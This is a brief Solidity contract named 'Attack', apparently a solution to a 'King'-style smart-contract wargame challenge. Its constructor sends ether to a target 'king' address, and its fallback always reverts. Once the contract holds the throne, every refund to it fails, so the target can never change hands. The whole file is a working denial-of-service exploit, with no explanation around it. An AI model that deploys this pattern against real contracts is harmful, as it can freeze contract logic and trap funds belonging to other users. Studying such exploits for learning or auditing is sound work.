// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    constructor(address _kingAddress) public payable {
        address(_kingAddress).call{value: msg.value}("");
    }

    fallback() external payable {
        revert("Pickle Rick!");
    }
}
